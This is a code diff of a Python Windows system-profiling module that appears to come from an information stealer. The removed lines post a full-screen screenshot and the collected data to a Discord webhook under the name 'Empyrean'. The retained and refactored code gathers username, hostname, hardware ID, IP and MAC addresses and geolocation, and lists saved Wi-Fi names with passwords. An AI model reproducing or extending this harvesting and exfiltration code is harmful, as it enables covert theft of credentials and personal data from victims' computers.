@@ -1,3 +1,4 @@
+from typing import Any
 import ctypes
 import os
 import re
@@ -7,64 +8,32 @@ import uuid
 import psutil
 import requests
 import wmi
-from discord import Embed, File, SyncWebhook
-from PIL import ImageGrab
-import time
-
+# from PIL import ImageGrab
 
 class SystemInfo():
-    def __init__(self) -> None:
-        embed = Embed(title="System Information", color=0x000000)
+    MODULE_NAME = "system_info"
+    
+    def __init__(self) -> dict[str, Any]:
+        # To keep the output readable, let's avoid screenshots just for now
+        # image = ImageGrab.grab(
+        #     bbox=None,
+        #     include_layered_windows=False,
+        #     all_screens=True,
+        #     xdisplay=None
+        # )
+        # image.save("screenshot.png")
 
-        embed.add_field(
-            name=self.user_data()[0],
-            value=self.user_data()[1],
-            inline=self.user_data()[2]
-        )
-        embed.add_field(
-            name=self.system_data()[0],
-            value=self.system_data()[1],
-            inline=self.system_data()[2]
-        )
-        embed.add_field(
-            name=self.disk_data()[0],
-            value=self.disk_data()[1],
-            inline=self.disk_data()[2]
-        )
-        embed.add_field(
-            name=self.network_data()[0],
-            value=self.network_data()[1],
-            inline=self.network_data()[2]
-        )
-        embed.add_field(
-            name=self.wifi_data()[0],
-            value=self.wifi_data()[1],
-            inline=self.wifi_data()[2]
-        )
+        res = {
+            "user_data": self.user_data(),
+            "system_data": self.system_data(),
+            "disk_data": self.disk_data(),
+            "network_data": self.network_data(),
+            "wifi_data": self.wifi_data(),
+        }
+        
+        return res
 
-        image = ImageGrab.grab(
-            bbox=None,
-            include_layered_windows=False,
-            all_screens=True,
-            xdisplay=None
-        )
-        image.save("screenshot.png")
-        embed.set_image(url="attachment://screenshot.png")
-
-        try:
-            webhook.send(
-                embed=embed,
-                file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
-            )
-        except:
-            pass
-
-        if os.path.exists("screenshot.png"):
-            os.remove("screenshot.png")
-
-    def user_data(self) -> tuple[str, str, bool]:
+    def user_data(self) -> dict[str, Any]:
         def display_name() -> str:
             GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
             NameDisplay = 3
@@ -81,13 +50,13 @@ class SystemInfo():
         hostname = os.getenv('COMPUTERNAME')
         username = os.getenv('USERNAME')
 
-        return (
-            ":bust_in_silhouette: User",
-            f"```Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
-            False
-        )
+        return {
+            "display_name": display_name,
+            "hostname": hostname, 
+            "username": username
+        }
 
-    def system_data(self) -> tuple[str, str, bool]:
+    def system_data(self) -> dict[str, Any]:
         def get_hwid() -> str:
             try:
                 hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
@@ -103,13 +72,14 @@ class SystemInfo():
                     0].TotalVisibleMemorySize) / 1048576, 0)
         hwid = get_hwid()
 
-        return (
-            "<:CPU:1004131852208066701> System",
-            f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nHWID: {hwid}```",
-            False
-        )
+        return {
+            "cpu": cpu,
+            "gpu": gpu,
+            "ram": ram,
+            "hwid": hwid
+        }
 
-    def disk_data(self) -> tuple[str, str, bool]:
+    def disk_data(self) -> dict[str, Any]:
         disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
         for part in psutil.disk_partitions(all=False):
             if os.name == 'nt':
@@ -119,34 +89,42 @@ class SystemInfo():
             disk += ("{:<9} "*4).format(part.device, str(
                 usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
 
-        return (
-            ":floppy_disk: Disk",
-            f"```{disk}```",
-            False
-        )
+        return {
+            "disk_info": disk
+        }
 
-    def network_data(self) -> tuple[str, str, bool]:
-        def geolocation(ip: str) -> str:
+    # hmm
+    def network_data(self) -> dict[str, Any]:
+        def geolocation(ip: str) -> dict[str, Any]:
             url = f"https://ipapi.co/{ip}/json/"
             response = requests.get(url, headers={
                                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
             data = response.json()
 
-            return (data["country"], data["region"], data["city"], data["postal"], data["asn"])
+            return {
+                "country": data["country"],
+                "region": data["region"],
+                "city": data["city"],
+                "postal": data["postal"],
+                "asn": data["asn"]
+            }
 
         ip = requests.get(
             "https://www.cloudflare.com/cdn-cgi/trace").text.split("ip=")[1].split("\n")[0]
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        country, region, city, zip_, as_ = geolocation(ip)
+        geo_data = geolocation(ip)
 
-        return (
-            ":satellite: Network",
-            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
-                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
-            False
-        )
+        return {
+            "ip": ip,
+            "mac": mac,
+            "country": geo_data["country"],
+            "region": geo_data["region"],
+            "city": geo_data["city"],
+            "zip": geo_data["postal"],
+            "asn": geo_data["asn"]
+        }
 
-    def wifi_data(self) -> tuple[str, str, bool]:
+    def wifi_data(self) -> dict[str, Any]:
         networks, out = [], ''
         try:
             wifi = subprocess.check_output(
@@ -181,8 +159,6 @@ class SystemInfo():
         for name, password in networks:
             out += '{:<20}| {:<}\n'.format(name, password)
 
-        return (
-            ":signal_strength: WiFi",
-            f"```{out}```",
-            False
-        )
+        return {
+            "wifi_info": out
+        }
